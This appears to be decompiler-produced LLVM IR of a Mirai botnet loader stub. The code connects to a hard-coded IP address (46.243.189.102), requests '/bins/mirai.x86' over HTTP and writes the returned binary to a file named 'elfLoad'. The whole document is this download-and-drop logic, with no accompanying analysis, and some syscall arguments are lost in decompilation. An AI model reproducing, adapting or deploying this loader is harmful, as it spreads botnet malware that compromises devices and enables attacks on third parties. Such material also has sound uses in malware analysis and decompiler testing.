source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

@ecx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@global_var_8048379.1 = constant [4 x i8] c"x86\00"
@global_var_804837d.2 = constant [7 x i8] c"MIRAI\0A\00"
@global_var_8048384.3 = constant [8 x i8] c"elfLoad\00"
@global_var_804838c.4 = constant [5 x i8] c"NIF\0A\00"
@global_var_8048391.5 = constant [33 x i8] c"GET /bins/mirai.x86 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_80483b2.6 = constant [5 x i8] c"FIN\0A\00"
@global_var_80493b8.7 = global i32 0

define i32 @function_8048094(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8048097 = zext i8 %arg1 to i32
  %v2_80480bb = mul i32 %arg4, 16777216
  %v4_80480a7 = mul i32 %arg3, 65536
  %v2_80480c4 = and i32 %v4_80480a7, 16711680
  %v2_80480c7 = or i32 %v2_80480bb, %v2_80480c4
  %v4_804809b = mul i32 %arg2, 256
  %v2_80480d4 = and i32 %v4_804809b, 65280
  %v2_80480d7 = or i32 %v2_80480d4, %v4_8048097
  %v2_80480d9 = or i32 %v2_80480c7, %v2_80480d7
  ret i32 %v2_80480d9
}

define i32 @function_80480dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_80480dc:
  %v2_80480e7 = call i32 @function_804832c(i32 1, i32 %arg1)
  ret i32 %v2_80480e7
}

define i32 @function_80480f1(i32 %arg1) local_unnamed_addr {
dec_label_pc_80480f1:
  %v2_80480fc = call i32 @function_804832c(i32 6, i32 %arg1)
  ret i32 %v2_80480fc
}

define i32 @function_8048103(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048103:
  %v4_8048114 = call i32 @function_804832c(i32 5, i32 %arg1)
  ret i32 %v4_8048114
}

define i32 @function_804811b(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804811b:
  %v3_804813b = call i32 @function_804832c(i32 102, i32 3)
  ret i32 %v3_804813b
}

define i32 @function_8048142(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048142:
  %v4_8048153 = call i32 @function_804832c(i32 4, i32 %arg1)
  ret i32 %v4_8048153
}

define i32 @function_804815a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804815a:
  %v4_804816b = call i32 @function_804832c(i32 3, i32 %arg1)
  ret i32 %v4_804816b
}

define i32 @function_8048172(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048172:
  %v3_8048192 = call i32 @function_804832c(i32 102, i32 1)
  ret i32 %v3_8048192

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804832c, { 4, 5, 0, 3, 1, 6, 2 }
}

define i32 @function_8048199() local_unnamed_addr {
dec_label_pc_80481ac.lr.ph:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-36 = alloca i32, align 4
  %v0_80481a1 = load i32, i32* %edi.global-to-local, align 4
  %v0_80481a2 = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80481ac

dec_label_pc_80481ac:                             ; preds = %dec_label_pc_80481ac.lr.ph, %dec_label_pc_80481ac
  %v0_80481ac12 = phi i32 [ ptrtoint ([4 x i8]* @global_var_8048379.1 to i32), %dec_label_pc_80481ac.lr.ph ], [ %v1_80481ac, %dec_label_pc_80481ac ]
  %v1_80481ac = add i32 %v0_80481ac12, 1
  %v1_80481ad = inttoptr i32 %v1_80481ac to i8*
  %v2_80481ad = load i8, i8* %v1_80481ad, align 1
  %v3_80481ad = icmp eq i8 %v2_80481ad, 0
  %v1_80481b0 = icmp eq i1 %v3_80481ad, false
  br i1 %v1_80481b0, label %dec_label_pc_80481ac, label %dec_label_pc_80481b2

dec_label_pc_80481b2:                             ; preds = %dec_label_pc_80481ac
  %v5_80481c7 = call i32 @function_8048142(i32 1, i32 ptrtoint ([7 x i8]* @global_var_804837d.2 to i32), i32 6)
  store i32 2, i32* %stack_var_-36, align 4
  %v5_80481e6 = call i32 @function_8048094(i8 46, i32 243, i32 189, i32 102)
  %v5_8048200 = call i32 @function_8048103(i32 ptrtoint ([8 x i8]* @global_var_8048384.3 to i32), i32 577, i32 511)
  store i32 %v5_8048200, i32* %edi.global-to-local, align 4
  %v5_8048210 = call i32 @function_8048172(i32 2, i32 1, i32 0)
  store i32 %v5_8048210, i32* %esi.global-to-local, align 4
  %v10_804821a = icmp eq i32 %v5_8048210, -1
  br i1 %v10_804821a, label %dec_label_pc_8048224, label %dec_label_pc_804821f

dec_label_pc_804821f:                             ; preds = %dec_label_pc_80481b2
  %v0_804821f = load i32, i32* %edi.global-to-local, align 4
  %v10_804821f = icmp eq i32 %v0_804821f, -1
  %v1_8048222 = icmp eq i1 %v10_804821f, false
  br i1 %v1_8048222, label %dec_label_pc_8048231, label %dec_label_pc_8048224

dec_label_pc_8048224:                             ; preds = %dec_label_pc_804821f, %dec_label_pc_80481b2
  %v2_8048229 = call i32 @function_80480dc(i32 1)
  %v0_8048238.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8048231

dec_label_pc_8048231:                             ; preds = %dec_label_pc_804821f, %dec_label_pc_8048224
  %v0_8048231 = phi i32 [ %v5_8048210, %dec_label_pc_804821f ], [ %v2_8048229, %dec_label_pc_8048224 ]
  %v0_8048238 = phi i32 [ %v5_8048210, %dec_label_pc_804821f ], [ %v0_8048238.pre, %dec_label_pc_8048224 ]
  %v2_8048232 = ptrtoint i32* %stack_var_-36 to i32
  %sext = mul i32 %v0_8048231, 16777216
  %v6_8048239 = sdiv i32 %sext, 16777216
  %v7_8048239 = call i32 @function_804811b(i32 %v0_8048238, i32 %v2_8048232, i32 16, i32 %v6_8048239)
  %v2_8048243 = icmp slt i32 %v7_8048239, 0
  %v1_8048245 = icmp eq i1 %v2_8048243, false
  br i1 %v1_8048245, label %dec_label_pc_8048263, label %dec_label_pc_8048247

dec_label_pc_8048247:                             ; preds = %dec_label_pc_8048231
  %v1_8048247 = sub i32 0, %v7_8048239
  store i32 %v1_8048247, i32* @ebx, align 4
  %v5_8048253 = call i32 @function_8048142(i32 1, i32 ptrtoint ([5 x i8]* @global_var_804838c.4 to i32), i32 4)
  %v0_8048258 = load i32, i32* @ebx, align 4
  %v2_804825b = call i32 @function_80480dc(i32 %v0_8048258)
  br label %dec_label_pc_8048263

dec_label_pc_8048263:                             ; preds = %dec_label_pc_8048231, %dec_label_pc_8048247
  %v1_804826a = add i32 %v0_80481ac12, -134513499
  store i32 %v1_804826a, i32* @ebx, align 4
  %v0_8048273 = load i32, i32* %esi.global-to-local, align 4
  %v5_8048274 = call i32 @function_8048142(i32 %v0_8048273, i32 ptrtoint ([33 x i8]* @global_var_8048391.5 to i32), i32 %v1_804826a)
  %v1_804827c = load i32, i32* @ebx, align 4
  %v12_804827c = icmp eq i32 %v5_8048274, %v1_804827c
  br i1 %v12_804827c, label %dec_label_pc_804828d, label %dec_label_pc_8048280

dec_label_pc_8048280:                             ; preds = %dec_label_pc_8048263
  %v2_8048285 = call i32 @function_80480dc(i32 3)
  br label %dec_label_pc_804828d

dec_label_pc_804828d:                             ; preds = %dec_label_pc_8048263, %dec_label_pc_8048280
  %v0_804828f18 = phi i32 [ %v5_8048274, %dec_label_pc_8048263 ], [ %v2_8048285, %dec_label_pc_8048280 ]
  store i32 0, i32* @ebx, align 4
  %v2_8048290 = ptrtoint i8* %stack_var_-17 to i32
  br label %dec_label_pc_804828f

dec_label_pc_804828f:                             ; preds = %dec_label_pc_80482af, %dec_label_pc_804828d
  %v0_804828f = phi i32 [ %v4_80482af, %dec_label_pc_80482af ], [ %v0_804828f18, %dec_label_pc_804828d ]
  %v0_8048296 = load i32, i32* %esi.global-to-local, align 4
  %sext20 = mul i32 %v0_804828f, 16777216
  %v6_8048297 = sdiv i32 %sext20, 16777216
  %v7_8048297 = call i32 @function_804815a(i32 %v0_8048296, i32 %v2_8048290, i32 1, i32 %v6_8048297)
  %v8_804829f = icmp eq i32 %v7_8048297, 1
  br i1 %v8_804829f, label %dec_label_pc_80482af, label %dec_label_pc_80482a2

dec_label_pc_80482a2:                             ; preds = %dec_label_pc_804828f
  %v2_80482a7 = call i32 @function_80480dc(i32 4)
  br label %dec_label_pc_80482af

dec_label_pc_80482af:                             ; preds = %dec_label_pc_804828f, %dec_label_pc_80482a2
  %v3_80482af = load i8, i8* %stack_var_-17, align 1
  %v4_80482af = sext i8 %v3_80482af to i32
  %v0_80482b3 = load i32, i32* @ebx, align 4
  %v2_80482b3 = mul i32 %v0_80482b3, 256
  %v2_80482b6 = or i32 %v2_80482b3, %v4_80482af
  store i32 %v2_80482b6, i32* @ebx, align 4
  %v9_80482b8 = icmp eq i32 %v2_80482b6, 218762506
  %v1_80482be = icmp eq i1 %v9_80482b8, false
  br i1 %v1_80482be, label %dec_label_pc_804828f, label %dec_label_pc_80482c0.preheader

dec_label_pc_80482c0.preheader:                   ; preds = %dec_label_pc_80482af
  %v2_80482c0 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_80482c0, i32* @ebx, align 4
  %v0_80482c642 = load i32, i32* @ecx, align 4
  %v0_80482cd43 = load i32, i32* %esi.global-to-local, align 4
  %sext2145 = mul i32 %v0_80482c642, 16777216
  %v6_80482ce46 = sdiv i32 %sext2145, 16777216
  %v7_80482ce47 = call i32 @function_804815a(i32 %v0_80482cd43, i32 %v2_80482c0, i32 128, i32 %v6_80482ce46)
  %tmp4148 = icmp slt i32 %v7_80482ce47, 1
  br i1 %tmp4148, label %dec_label_pc_80482e8, label %dec_label_pc_80482da

dec_label_pc_80482da:                             ; preds = %dec_label_pc_80482c0.preheader, %dec_label_pc_80482da
  %v7_80482ce49 = phi i32 [ %v7_80482ce, %dec_label_pc_80482da ], [ %v7_80482ce47, %dec_label_pc_80482c0.preheader ]
  %v0_80482dd = load i32, i32* %edi.global-to-local, align 4
  %v5_80482de = call i32 @function_8048142(i32 %v0_80482dd, i32 %v2_80482c0, i32 %v7_80482ce49)
  store i32 %v2_80482c0, i32* @ebx, align 4
  %v0_80482c6 = load i32, i32* @ecx, align 4
  %v0_80482cd = load i32, i32* %esi.global-to-local, align 4
  %sext21 = mul i32 %v0_80482c6, 16777216
  %v6_80482ce = sdiv i32 %sext21, 16777216
  %v7_80482ce = call i32 @function_804815a(i32 %v0_80482cd, i32 %v2_80482c0, i32 128, i32 %v6_80482ce)
  %tmp41 = icmp slt i32 %v7_80482ce, 1
  br i1 %tmp41, label %dec_label_pc_80482e8, label %dec_label_pc_80482da

dec_label_pc_80482e8:                             ; preds = %dec_label_pc_80482da, %dec_label_pc_80482c0.preheader
  %v0_80482eb = load i32, i32* %esi.global-to-local, align 4
  %v2_80482ec = call i32 @function_80480f1(i32 %v0_80482eb)
  %v0_80482f1 = load i32, i32* %edi.global-to-local, align 4
  %v2_80482f4 = call i32 @function_80480f1(i32 %v0_80482f1)
  %v5_8048305 = call i32 @function_8048142(i32 1, i32 ptrtoint ([5 x i8]* @global_var_80483b2.6 to i32), i32 4)
  %v2_8048311 = call i32 @function_80480dc(i32 5)
  store i32 %v0_80481a2, i32* %esi.global-to-local, align 4
  store i32 %v0_80481a1, i32* %edi.global-to-local, align 4
  ret i32 %v2_8048311

; uselistorder directives
  uselistorder i32 %v7_80482ce, { 1, 0 }
  uselistorder i32 %v2_80482c0, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v5_8048274, { 1, 0 }
  uselistorder i32 %v5_8048210, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80481ac, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 9, 1, 2, 5, 3, 4, 0, 6, 7, 8 }
  uselistorder i32* %edi.global-to-local, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32)* @function_80480f1, { 1, 0 }
  uselistorder i32 128, { 1, 0 }
  uselistorder i32* @ecx, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804815a, { 2, 0, 1 }
  uselistorder i32 4, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 5, 4, 7, 6, 8 }
  uselistorder i32 (i32)* @function_80480dc, { 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_8048142, { 4, 3, 2, 1, 0 }
  uselistorder i32 1, { 6, 5, 2, 3, 4, 7, 8, 9, 10, 16, 15, 13, 14, 1, 0, 11, 12 }
  uselistorder label %dec_label_pc_80482da, { 1, 0 }
  uselistorder label %dec_label_pc_80482af, { 1, 0 }
  uselistorder label %dec_label_pc_804828d, { 1, 0 }
  uselistorder label %dec_label_pc_8048263, { 1, 0 }
  uselistorder label %dec_label_pc_8048231, { 1, 0 }
  uselistorder label %dec_label_pc_80481ac, { 1, 0 }
}

define i32 @entry_point() local_unnamed_addr {
entry:
  %v0_8048325 = call i32 @function_8048199()
  ret i32 %v0_8048325
}

define i32 @function_804832c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804832c:
  %v0_804832f = load i32, i32* @ebx, align 4
  %v1_804834c = call i32 @int80_syscall(i32 %arg1)
  store i32 %v0_804832f, i32* @ebx, align 4
  %v5_8048352 = icmp ult i32 %v1_804834c, -4095
  %v1_8048357 = icmp eq i1 %v5_8048352, false
  br i1 %v1_8048357, label %dec_label_pc_804835e, label %dec_label_pc_804835d

dec_label_pc_804835d:                             ; preds = %dec_label_pc_804832c
  ret i32 %v1_804834c

dec_label_pc_804835e:                             ; preds = %dec_label_pc_804832c
  %v1_8048363 = sub i32 0, %v1_804834c
  %v0_8048365 = call i32 @function_8048373()
  %v2_804836a = inttoptr i32 %v0_8048365 to i32*
  store i32 %v1_8048363, i32* %v2_804836a, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804834c, { 1, 0, 2 }
  uselistorder i32* @ebx, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10 }
}

define i32 @function_8048373() local_unnamed_addr {
dec_label_pc_8048373:
  ret i32 ptrtoint (i32* @global_var_80493b8.7 to i32)

; uselistorder directives
  uselistorder i32 0, { 5, 4, 6, 7, 2, 1, 0, 3, 8, 9 }
}

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i8 @__decompiler_undefined_function_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr
